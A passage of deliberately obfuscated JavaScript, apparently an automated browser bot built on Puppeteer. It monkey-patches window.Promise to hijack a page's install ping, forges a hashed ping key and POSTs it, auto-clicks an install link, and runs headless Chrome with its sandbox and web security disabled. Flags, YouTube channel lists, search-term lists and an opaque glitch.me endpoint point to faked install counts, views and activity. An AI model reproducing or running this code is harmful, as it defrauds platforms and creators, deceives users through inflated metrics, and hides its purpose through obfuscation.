                J[-0x1e2c + 0x202 + -0x1 * -0x1c3a] = this['block'], J[K >> 0x6c9 + -0xb94 + 0x4cd] |= x[-0xbba * 0x1 + 0x29a * 0x4 + -0x1 * -0x155 & K], this['block'] = J[0x6 * 0x1b2 + 0x1cbc + 0x8 * -0x4db], K >= -0x110f + -0x11f8 + 0x233f && (this['hashed'] || this['hash'](), J[-0x18f + -0xe * -0x133 + -0xf3b] = this['block'], J[0x2466 + -0x2 * 0xecb + 0x60 * -0x12] = J[0x1a4 + -0x187f * 0x1 + 0x16dc] = J[-0x20 * -0x82 + -0x1ca + -0xe74 * 0x1] = J[-0xb24 + 0xb9e * 0x2 + 0x407 * -0x3] = J[0xeb8 + 0x18cb + -0x277f] = J[0x197 + -0x26f5 + -0x1 * -0x2563] = J[0x1 * 0xf45 + 0x8c0 + -0x1 * 0x17ff] = J[0x26f4 + -0xa3 * -0x9 + 0x2ca8 * -0x1] = J[-0x872 * -0x2 + 0x76 * -0x8 + 0x34b * -0x4] = J[-0x1 * -0x21b3 + -0xc * -0xa0 + -0x292a] = J[-0x203 * 0xe + 0x1c7b + -0x47] = J[-0x1a65 * 0x1 + -0x379 * 0x6 + -0x3 * -0xfc2] = J[-0x1 * -0xc5c + -0x16b0 + 0xa60] = J[0x21a5 + -0xe11 + -0x1 * 0x1387] = J[0xb * -0xd7 + -0x2d * 0x5 + 0xa2c] = J[0x1b * 0xd9 + -0x1484 + 0x4a * -0x8] = 0x5 * -0x56d + -0x3f2 * 0x6 + 0x32cd), J[0x1091 + -0x3 * 0x9b7 + 0x3 * 0x436] = this['hBytes'] << -0xf3 + 0x251d + -0x2427 | this['bytes'] >>> 0x671 * -0x1 + 0x2538 + -0x1eaa, J[-0x1a3f + 0x12f0 + 0x75e] = this['bytes'] << 0x17d8 + 0x2130 + -0x3905, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x19f3 + 0x1 * -0x149c + -0x547; J < -0x20b * 0xd + -0x7df + 0x2 * 0x115f; ++J)
                K = Q[J - (-0x59 * -0x32 + 0xe1 + -0x1240)] ^ Q[J - (-0xbd * -0x10 + 0x10d * -0x1d + 0x12b1)] ^ Q[J - (0x1430 + -0x3d0 + 0x1052 * -0x1)] ^ Q[J - (-0x4e0 + -0x87 * -0x2d + -0x12cb)], Q[J] = K << -0x127 * 0x4 + 0x1 * 0x1452 + -0xfb5 | K >>> 0x342 + -0x2614 * -0x1 + -0x2937;
              for (J = -0xbf8 * 0x1 + 0x1eb9 + -0x12c1; J < 0x30 * -0x44 + 0x187 * -0x19 + 0x5ab * 0x9; J += -0x1 * 0xd0a + -0x4e9 + 0x11f8)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x4f4 + 0x9 * 0x67 + -0x2 * -0xad | L >>> 0x7 * 0x133 + 0x1933 + -0x217d * 0x1) + (M & N | ~M & O) + P + (0x1 * 0x7066a91d + 0x791169f * -0x10 + 0x632d3a6c) + Q[J] << 0x1be5 + -0x1268 + -0x97d * 0x1) << 0x239f + -0xe * -0x69 + -0x2958 | P >>> 0xd10 + -0x1d5f + 0x1 * 0x106a) + (L & (M = M << -0xfe1 + 0x3 * 0x51b + -0x1 * -0xae | M >>> -0x1b7 * 0x3 + -0xc56 * 0x3 + 0x2a29) | ~L & N) + O + (0x28a7841b + -0x7f * 0x473acb + -0x55312033 * -0x1) + Q[J + (-0xa0c * 0x1 + 0x2 * -0xdf6 + 0x25f9)] << -0x2af * 0xb + -0x14b + 0x1ed0) << -0x1ac4 + -0xf39 * -0x1 + 0xb90 | O >>> 0x22b + -0x22 * 0x6f + 0xcae) + (P & (L = L << 0x1d91 + 0x2555 * 0x1 + 0x10b2 * -0x4 | L >>> 0x64d + -0x1597 + 0xf4c) | ~P & M) + N + (-0x4a1ccebc + -0x3b9f17f2 + 0xe03e6047) + Q[J + (0xe26 + 0x4b * -0x13 + 0x1b7 * -0x5)] << -0x25b9 + -0x1383 + 0x393c) << -0x1 * -0xa1e + 0x1bd + -0xbd6 | N >>> -0x16 * -0x9f + 0x972 + 0x3 * -0x7ab) + (O & (P = P << -0x2 * -0x1337 + 0x258 + -0x1454 * 0x2 | P >>> -0x1655 + -0x3 * -0x7e4 + -0x155) | ~O & L) + M + (-0x4226d5 * -0x287 + -0x2447d3d6 * -0x2 + -0x953d5266) + Q[J + (-0xed4 + -0x22d6 + 0x31ad)] << -0x124f + -0x2236 + 0x3485 * 0x1) << -0xaae * -0x1 + 0x10b7 + -0x4 * 0x6d8 | M >>> 0x1ff1 * 0x1 + -0x1628 + -0x9ae) + (N & (O = O << 0x21 * 0xdb + -0xba + -0x1b63 | O >>> -0xe * 0x28f + 0xa64 + -0x8 * -0x32e) | ~N & P) + L + (-0x1 * -0x5a681278 + 0xb2af * -0xd84d + -0x95 * -0x10391b4) + Q[J + (0x87e + -0x2126 + 0x18ac)] << 0x19c8 + -0x1 * 0xa57 + 0x3b * -0x43, N = N << -0xb48 + -0x10d0 + 0x9d * 0x2e | N >>> 0x32b * -0x5 + 0xb01 + -0x28 * -0x1f;
              for (; J < 0x24bc * 0x1 + 0x24 * -0xa + -0x2 * 0x1196; J += -0x22c9 + -0x265d + 0x492b * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x11 * -0xf9 + -0x8 * 0x10f + 0x14 * -0x67 | L >>> -0x1490 + -0x1 * -0x3b7 + -0xd9 * -0x14) + (M ^ N ^ O) + P + (0x27 * 0x2174fb + 0x1 * 0xb60a3b6b + -0x4c492207) + Q[J] << 0x1 * -0x24af + 0x24ed + -0x1 * 0x3e) << -0x1906 + -0x84d + 0x856 * 0x4 | P >>> 0xa21 * -0x3 + -0x1d * -0x56 + 0x2 * 0xa60) + (L ^ (M = M << 0x259e + 0x1 * 0xd70 + 0x28c * -0x14 | M >>> -0x151d + -0x3 * 0xbf2 + 0x38f5) ^ N) + O + (-0x3 * -0x27da657b + -0xfc43d * 0x8d2 + 0x825b9d3a) + Q[J + (-0x1b35 + 0x1580 + 0x5b6)] << -0x510 + -0x10db + 0x15eb * 0x1) << -0x35b + 0x2e * 0xb3 + -0x1cca | O >>> -0x57f + 0x174b + -0x11b1 * 0x1) + (P ^ (L = L << 0x215b + -0x753 + -0x1 * 0x19ea | L >>> 0xb * 0xe1 + 0x2bd * 0xa + 0x6d * -0x57) ^ M) + N + (0x6efdac41 + -0x3702adb5 + -0x1 * -0x36deed15) + Q[J + (-0xe89 + 0x2516 + -0x168b)] << -0x1b58 + 0x2 * 0x1237 + -0x916 * 0x1) << -0x709 * 0x2 + -0x1189 + 0x1fa0 | N >>> -0x817 + 0x10 * -0x17e + 0x2012) + (O ^ (P = P << -0x1268 + 0x2f * -0x92 + 0x2d54 | P >>> -0x53e + -0x2709 + 0x2c49) ^ L) + M + (0x42ab8d18 + -0x91b43 * -0xce6 + -0x494743a9) + Q[J + (-0x8a4 * -0x4 + 0x1 * 0x1c49 + -0x3ed6)] << 0x16 * -0x7c + -0x1 * 0x1d03 + -0x2a5 * -0xf) << -0x684 + 0x8a3 * -0x3 + 0x2072 | M >>> -0x1d * 0x73 + 0x63e + 0x6e4) + (N ^ (O = O << -0x1aaa + 0x20d0 + 0x8 * -0xc1 | O >>> 0x2f * -0x43 + -0x19c5 + -0x2 * -0x130a) ^ P) + L + (0x7c65ebfb + 0x1af1ceab + -0x287dcf05) + Q[J + (0x2 * 0xbf2 + -0x62 * 0x4a + -0x474 * -0x1)] << -0xd27 + 0xec6 + -0x19f, N = N << -0x1000 + -0x5c1 + -0x1fd * -0xb | N >>> -0x1641 + 0x1 * 0x55d + 0x1 * 0x10e6;
              for (; J < 0x12a4 * -0x2 + 0x2 * 0x10ff + 0x386; J += 0x1524 + 0x98e * 0x3 + -0x31c9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x42 * 0x52 + -0xf18 + 0x1 * 0x2441 | L >>> 0xaab * 0x1 + 0x2 * 0x6f + -0xb6e) + (M & N | M & O | N & O) + P - (0x1fd5cb * 0x6a7 + 0xae2209f4 + -0x11105003d) + Q[J] << 0x216c + -0x3a4 * -0xa + -0x45d4 * 0x1) << -0x1 * -0x21f3 + 0x1294 + -0x3482 | P >>> 0x5 * 0x24b + -0x1 * -0xc7a + 0x153 * -0x12) + (L & (M = M << 0xdc + 0x13c9 + -0x1487 | M >>> 0x11 * -0xc0 + -0x644 + 0x1306) | L & N | M & N) + O - (0xa6ace53f + -0xa9d9957d + 0x348d * 0x2356a) + Q[J + (-0x90b * -0x2 + 0x1 * 0x961 + 0x57e * -0x5)] << -0xe95 + 0x205d + -0x11c8) << -0x4 * 0x824 + -0x1 * -0xae7 + 0x15ae | O >>> 0x4a * -0x5c + -0x1 * -0x67b + 0x1438) + (P & (L = L << 0x3e2 * -0x6 + 0x39 + -0x7bb * -0x3 | L >>> -0x1423 + 0x2 * 0x411 + -0x5 * -0x267) | P & M | L & M) + N - (0xa18244f * -0x12 + -0xd1f8c5f1 + 0x1f88f96a3) + Q[J + (0x335 * 0x1 + 0x407 * -0x1 + 0xd4)] << -0x13 * -0x148 + -0x18 * -0x116 + -0x3268) << -0x1461 + -0x19 * 0x124 + 0x2 * 0x1875 | N >>> 0x2074 + 0x4da + -0x2533 * 0x1) + (O & (P = P << -0x19c3 + 0x1 * 0xa13 + -0x77 * -0x22 | P >>> 0x1731 + 0x1a86 + -0x1 * 0x31b5) | O & L | P & L) + M - (0x47dc07ad + -0x62d79729 * 0x1 + 0x8bdfd2a0) + Q[J + (0x202 * -0xd + -0x1149 * 0x1 + 0x2b66)] << -0x13f8 + -0x8 * -0x421 + -0xd10) << -0x2411 + 0xb8d * -0x3 + 0x46bd | M >>> 0x1 * -0x217e + 0x9 * 0xff + 0x836 * 0x3) + (N & (O = O << -0x1 * 0xcb9 + 0x1fd * -0xe + -0x3 * -0xd8f | O >>> 0x266e + -0x30a + -0x2362) | N & P | O & P) + L - (0x38c05 * 0x125d + 0xdd916de7 + -0xadcf6294) + Q[J + (-0x151f * 0x1 + -0x19f * -0x5 + 0xd08)] << 0x206f + 0x1e2 * 0x11 + -0x4071, N = N << 0x2 * 0x3f3 + -0x41 + -0x787 | N >>> -0x109c + -0x628 + 0x6e * 0x35;
              for (; J < 0x13c * 0x1 + 0x1267 + -0x1353; J += -0x94d * -0x3 + -0x2e6 * -0xc + -0x3eaa * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1474 + -0x4d5 * 0x2 + 0x1 * 0x1e23 | L >>> -0xf37 + 0x20f6 + -0x8d2 * 0x2) + (M ^ N ^ O) + P - (0x6a00dc21 + -0x26705cbb + -0xdf3413c) + Q[J] << 0x65 * 0x1f + 0x1 * 0xa88 + -0x16c3 * 0x1) << 0xd72 + 0x1 * -0x1edd + 0x1170 | P >>> -0x8 * 0x77 + -0x1c1c * 0x1 + 0x1fef) + (L ^ (M = M << -0x383 * -0x1 + 0x3 * 0x839 + -0x1c10 | M >>> 0x16b1 * 0x1 + 0x1f13 * -0x1 + 0x166 * 0x6) ^ N) + O - (-0x2a43 * 0x24080 + 0x290d8f5 * -0x25 + 0xf3b87b13) + Q[J + (-0x17f7 + -0xaa6 + 0x229e)] << 0x1d46 + -0x7c9 + -0x157d) << 0x858 + 0xb7d + -0x13d0 | O >>> -0x10cb * -0x1 + 0x3 * -0x69d + 0x327) + (P ^ (L = L << -0x1796 + 0x2f0 + 0x14c4 | L >>> -0x5 * -0xdd + -0x1 * -0x19b5 + -0x1e04) ^ M) + N - (0x8941a * -0x9c7 + -0x1 * 0x5c52682f + 0x16df * 0xa0c51) + Q[J + (0xd6b * 0x2 + 0x1dfb + 0x38cf * -0x1)] << -0x1 * -0x1714 + 0xf + -0x1 * 0x1723) << 0x7d0 + 0x1 * -0x16f7 + -0x2 * -0x796 | N >>> 0x288 * 0x4 + 0x3f6 + 0x1 * -0xdfb) + (O ^ (P = P << -0x1 * -0x1803 + 0x37 * -0x35 + -0x1 * 0xc82 | P >>> -0xaed + -0x7e * -0x35 + -0x3 * 0x50d) ^ L) + M - (-0x59a * 0x5991e + 0x4af37de7 + 0xa05724f) + Q[J + (0x554 * -0x6 + -0x3 * 0xb9d + 0x42d2)] << -0xa85 + 0x1 * 0xe19 + 0x1 * -0x394) << -0x14f4 * 0x1 + 0xf1 + -0x4 * -0x502 | M >>> -0x1 * -0x21a1 + -0x3bb * 0x3 + -0x1655) + (N ^ (O = O << -0x1a5f * 0x1 + -0x188d + 0x330a | O >>> 0x1cbf + 0x1d28 + -0x39e5) ^ P) + L - (-0x2711b091 + -0x180db50f + 0x74bca3ca) + Q[J + (-0x13bf * -0x1 + 0x1d * 0x67 + 0x1 * -0x1f66)] << -0x2398 + 0xcd0 + 0xf3 * 0x18, N = N << -0x1a5 * 0x1 + 0x1 * -0xae7 + 0x1 * 0xcaa | N >>> 0x223b + 0x8 * 0x35d + 0x1 * -0x3d21;
              this['h0'] = this['h0'] + L << -0x1 * 0x527 + 0x680 + -0x159, this['h1'] = this['h1'] + M << -0x25 * -0x43 + -0x1e38 + 0x1489 * 0x1, this['h2'] = this['h2'] + N << 0x1f2f + 0x1de0 * 0x1 + -0x3d0f, this['h3'] = this['h3'] + O << 0x2 * 0xeb1 + 0x13d + -0x25b * 0xd, this['h4'] = this['h4'] + P << -0x23c8 + 0x737 + -0x47 * -0x67;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x3 * -0xa63 + -0x31 * -0xc9 + -0x39a * 0x2 & -0x199e + 0xa58 + 0x19 * 0x9d] + w[J >> 0xd * 0xcd + -0x1 * -0x886 + -0x12d7 & 0x188a + -0x1165 + -0x716] + w[J >> 0x7 * 0xca + -0x1 * -0x16ff + -0x1c71 & 0x1 * 0x9dc + 0x16b4 + 0x2081 * -0x1] + w[J >> 0x1420 + -0x247e + 0x106e & 0x2096 + 0x22 + -0xae3 * 0x3] + w[J >> 0x2447 + -0x1ea + 0x7 * -0x4e7 & -0x23 * 0x9b + -0x27d * 0x4 + 0x4 * 0x7cd] + w[J >> -0x1 * -0x2603 + 0x1 * -0x1097 + -0x1564 & 0x20e6 + -0xbf0 + -0x14e7 * 0x1] + w[J >> 0x1f48 + 0x161d + -0x3561 & 0x1fd0 + -0x10ee + -0xed3] + w[0x22ac * -0x1 + 0x1672 * 0x1 + 0xc49 & J] + w[K >> 0x1 * -0x2033 + 0x1785 * -0x1 + 0x37d4 & 0x1 * -0x21fa + 0x1da4 + 0xf * 0x4b] + w[K >> -0x103b + 0xf47 + 0x10c & 0x31f + -0x1 * 0x1ead + 0x1b9d] + w[K >> -0xe12 * -0x2 + -0x1 * 0x1280 + -0x990 & 0x1bc4 + -0x1 * -0x112f + 0x152 * -0x22] + w[K >> -0x49 * 0x2f + 0x15 * -0x191 + -0x2b * -0x114 & -0x95d + 0x35a + 0x4a * 0x15] + w[K >> 0x11d6 + 0x9f5 + -0x1bbf * 0x1 & 0x1 * 0x1897 + 0x8 * 0x1fe + -0x2878] + w[K >> -0x1344 + -0x1534 + -0xa2 * -0x40 & 0x23dc + -0x138d + -0x1040] + w[K >> -0x1ec * 0xd + 0x1f0c + -0x60c & -0x1483 + 0x97f + 0x3b1 * 0x3] + w[-0x12ba + 0x2f * 0x37 + 0x8b0 & K] + w[L >> -0x1de9 + 0x57 * -0x49 + 0x16 * 0x27e & 0x1145 + -0x2573 + 0x143d] + w[L >> -0x53 * -0x59 + 0x1 * -0x1cbb + -0x8 & 0x1c65 + -0xd1b + -0x7 * 0x22d] + w[L >> 0x1ef0 * -0x1 + -0x1d63 + -0x2f * -0x149 & 0x2598 + -0x1e4 + -0x23a5] + w[L >> 0x164b + 0x1800 + 0x2e3b * -0x1 & 0xb4c + 0x5e * -0x3b + -0x9d * -0x11] + w[L >> -0x8c4 + -0x18d * 0x4 + -0xf04 * -0x1 & 0x26f * 0xa + -0x4 * -0x384 + -0x2657] + w[L >> 0x1 * -0xec + 0x10ab * 0x1 + -0x1bf * 0x9 & 0x277 * 0x7 + -0x4f * 0x25 + -0x5c7] + w[L >> 0x35 * -0x6d + -0x13e0 + -0x2a75 * -0x1 & 0xfd7 * 0x2 + 0x1756 * 0x1 + -0x36f5] + w[0xe5f + 0x6 * 0x2fa + -0x202c & L] + w[M >> -0x1 * 0x8f3 + -0x1e4 * -0xa + -0x9d9 & -0x8b8 + 0x127f + -0x9b8] + w[M >> 0x1a54 * 0x1 + 0x1 * -0x2185 + -0x749 * -0x1 & -0x3d5 * 0x6 + -0x17f4 + -0x23d * -0x15] + w[M >> -0x1c49 + -0x451 * 0x9 + 0x4336 & -0x5c4 + -0x1c71 + 0x2244] + w[M >> 0x73 * 0x3 + 0x8bb * 0x4 + -0x2435 & -0xa87 * 0x3 + 0xae3 + 0x14c1] + w[M >> 0x9a0 + 0x3 * -0x3e5 + 0x21b & -0x989 * 0x1 + -0x6a7 * -0x3 + -0xa5d] + w[M >> -0x1898 + -0x5 * 0x79d + 0x3eb1 & -0x1 * 0x15d7 + 0x1009 + 0x5dd * 0x1] + w[M >> 0x1a6e + 0x1cc6 + -0xdcc * 0x4 & 0x5e * 0xb + -0x2639 + 0x223e] + w[-0x1cf0 + -0x1521 + 0x3220 & M] + w[N >> -0x1 * -0x1c6f + -0x236b + 0x718 & -0x8e * 0x3e + -0x1 * -0x2099 + 0x1da] + w[N >> -0x283 * 0xd + 0x1 * 0x409 + 0x1cb6 & -0x1 * 0x26fd + -0x21a2 + 0x7 * 0xa62] + w[N >> 0x1a8a + 0x18d + -0x65 * 0x47 & -0x2128 + 0x8b2 * 0x1 + 0x1 * 0x1885] + w[N >> -0x234c + -0xca * 0xd + 0x1 * 0x2d9e & 0x6b * -0x57 + -0xa3 + -0x35 * -0xb3] + w[N >> 0x1e84 + 0x173e + -0x226 * 0x19 & 0x17d8 + -0x9 * -0x1d5 + -0x2846] + w[N >> -0x100e + -0x1aeb + 0x2b01 & -0x1485 + 0x1295 + 0x49 * 0x7] + w[N >> -0xa * 0x1c7 + -0x2479 + 0x1d * 0x1df & 0x139 * -0x1f + 0x1272 + 0x1384] + w[0x1 * -0x24b5 + -0x1fb4 + 0x88f * 0x8 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x96 + -0xff * 0x7 + 0x67b & -0x19c7 + -0x205 * -0xa + 0x694,
                J >> -0x1f09 * -0x1 + 0x199c + 0x1 * -0x3895 & 0x2579 * 0x1 + -0x1394 + -0x10e6,
                J >> 0x2f2 + -0x1977 + 0x168d & -0x41a + 0x71 * 0x43 + 0xf1 * -0x1a,
                0x4 * -0x821 + -0x59 * -0x67 + -0x24c & J,
                K >> -0xef * 0x12 + 0x1ad9 + 0x351 * -0x3 & -0x2d * 0x2c + 0x1 * -0x21ff + 0x2aba,
                K >> 0x2528 + 0x2002 + -0x5 * 0xdd2 & 0x1f23 + 0xdbb + -0x2bdf,
                K >> 0x3 * 0x1c9 + 0x2 * 0xe55 + -0x21fd & 0x17 * -0x131 + 0x197b + -0x53 * -0x9,
                -0x2449 * -0x1 + -0xb57 * -0x1 + -0xad * 0x45 & K,
                L >> 0x1db4 + -0x2 * 0x282 + -0x1898 & 0x4e2 * 0x4 + 0x874 * -0x2 + 0x1a1 * -0x1,
                L >> -0x1 * 0x2406 + 0x19af + 0x1 * 0xa67 & -0x18dd + 0xa * 0xef + 0x5e * 0x2d,
                L >> 0x1fc2 + -0xe5f + -0x3 * 0x5c9 & 0x4 * 0x39e + -0x2 * 0x301 + 0x7 * -0x111,
                -0x1 * -0x229 + -0x1 * -0x1429 + -0x67 * 0x35 & L,
                M >> 0x6 * -0x387 + 0x1e5e + -0x4 * 0x247 & -0x5 * -0x1b3 + -0x128b + -0xb * -0x101,
                M >> -0x13b * 0x9 + -0x1e77 + 0x1e * 0x163 & -0x2d4 * -0x9 + 0x4fd * 0x7 + -0x3b60,
                M >> -0xd1e + 0x20f + 0x1 * 0xb17 & -0x287 * -0x6 + 0xa15 + -0x1840,
                -0x235b * -0x1 + -0x183 + -0x20d9 & M,
                N >> -0xaea + 0x1 * -0x69f + 0x11a1 & 0x13e3 * 0x1 + 0xb5 * -0x29 + 0xa19,
                N >> 0xaa2 * -0x1 + 0x1aa4 + -0xff2 & -0x1102 * -0x1 + 0xdf3 + 0x2 * -0xefb,
                N >> -0x180a + 0x1829 + -0x17 * 0x1 & 0x1 * 0x1c9a + 0x11a * -0xe + -0xc2f,
                0x1a22 + -0x4e8 + -0x143b & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1475 + 0x1afc + -0x673), (K = new DataView(J))['setUint32'](0x1e57 + 0x175 * -0x11 + -0x592, this['h0']), K['setUint32'](0x2 * 0x1366 + -0x899 + -0x1e2f, this['h1']), K['setUint32'](0x8de * 0x1 + -0x3 * -0x71c + 0xd * -0x252, this['h2']), K['setUint32'](0x1a99 + 0x106a + -0x287 * 0x11, this['h3']), K['setUint32'](-0x144d + 0x965 + -0x24 * -0x4e, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x139 * 0x11 + -0x122e + -0x591 * -0x7];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x19da + 0x1 * -0xf6b + 0x2945;
            J[0x13c1 + 0x1a4e + 0x38b * -0xd]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1464 + 0x1 * -0x9b9 + -0xaab * 0x1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1996 + 0x2149 + 0x2ad * -0x16), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x200 + -0x1 * -0xfef + -0xdee * 0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x864 * -0x1 + 0xb4b + -0xdd3 * 0x1), Promise['resolve'](0x339 + 0x1 * -0x1dd7 + 0x1a9f);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1be7 + -0x1656 + 0x1 * -0x591; j < -0x26ce + -0x17ad + 0x3e7c; j++)
    i();
}
const NETWORK_PATIENCE = 0x173a + -0x265b * -0x1 + -0x1 * 0x1e55 + (0x1c82 + 0x217e + 0x1924 * -0x2) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0xa7 * -0xe + 0x2317 + -0x2c36) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + W(0x15),
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + X(0xf, 'z9*w') + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x5 * 0x3fa + 0x1d75 + -0x2e7 * 0x11; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 